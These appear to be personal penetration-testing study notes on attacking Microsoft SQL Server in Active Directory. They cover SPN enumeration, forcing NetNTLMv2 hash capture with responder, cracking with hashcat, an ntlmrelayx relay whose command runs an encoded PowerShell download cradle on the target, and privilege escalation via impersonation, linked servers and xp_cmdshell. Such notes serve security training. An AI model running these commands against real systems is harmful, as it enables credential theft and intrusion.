## Microsoft SQL attacks

MSSQL in AD have SPN. To query the DC:
[[Active Directory]]
#AD #SPN #cmd
``` cmd
setspn -T corp1 -Q MSSQLSvc/*
```

#useful-script #ps1
```powershell
. .\GetUserSPNs.ps1
```

### Authentication in MSSQL

In AD this is handled by Kerberos, and the mapping between the user and dbo is done. If no mapping, the user will be guest. To login mapped to sa will have sysadmin role. 

Domain Users are member of Builtin Users group which has access by default.

For code refer to the mssql-exp VS project.

### UNC Path Injection 

The idea is to force the MSSQL to connect to our SMB share so we capture NETNTLMv2 hash for cracking, later we will also learn to relay the hash.
We must provide the UNC path with IP, not hostname as Windows would automatically switch from Kerberos to NetNTLM. 

Run the mssql-exp binary, but start the responder first on Kali to get the hash.
#NetNTLM #responder
``` bash
sudo responder -I tun0
```

For cracking.
#hashcat #cracking
``` bash
sudo hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```


### Relay NetNTLM hash

To not crack the hash we can relay it - the password may be strong. If the user whose hash we relay is local admin, we can get code exec. It is only possible if SMB signing not enabled (enabled by default on DC, but not on the standard Windows Servers).

To start the relay attack we give the encoded ps1 with download cradle:
#encoding #impacket
``` bash
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.120.6 -c 'powershell -enc <encoded_download_cradle>'
```

### MSSQL Priv escalation

The goal is to obtain access to the user who is sysadmin in MSSQL - we can use the AD priv esc. We can also do impersonation with the usage of EXECUTE AS - only certain users can use impersonation; not every user has it, there must be misconfig. We can Impersonate on user and login (EXECUTE AS USER/LOGIN). We can enumerate which account allows impersonation, but we cannot enumerate who can impersonate them.
For execute as USER we must do it on the msdb as it is TRUSTWORTHY with user dbo as he has sa.

#### Linked SQL Servers for Priv Escalation

MSSQL can be linked together. When the link is create the admin specifies execution context - it can be dynamic based on the current context, but admins can choose specific SQL login, like with the impersonation (admin misconfig). The stored procedure sp_linkedserver can be used for enum. Then, we must enum which context is running on the Linked MSSQL - if sa we can execute code, if not we can try to repeat the enum with Linked MSSQL servers.
When we enum for security context using the openquery it is important to escape double quotes with backslash. In the EXEC AT synatax, it is important to escape single quote, it is escaped by the second single quote. 
The **RECONFIGURE** on the Linked MSSQL server requires to have the **RPC Outbound ** (it is not set by defaut but it might eb set), if we are in sysadmin role we can enable RPC Out with the **sp_serveroption** stored procedure. 

Links are **not bidirectonal** , but there can be connection back home, so if we want to come home or move across different links, we must always perform the same steps.
1. Enum Linked MSSQL Servers
2. Enum the security context of this Link
3. If sa over link we can get Code Execution, if not we can repeat. 


### Getting code execution 

To obtain code execution we can use: xp_cmdshell, sp_oacreate (Ole Automation Procedure) or through loading custom assembly. Refer to the mssql-exp in code section for implementation.

For Custom Assemblies we can use the CREATE ASSEMBLY procedure, but that also requires TRUSTWORTHY db. We import managed dll as an object and execute. To hex encode assembly we use the follow:
[[Oneliners#^6217c2]]






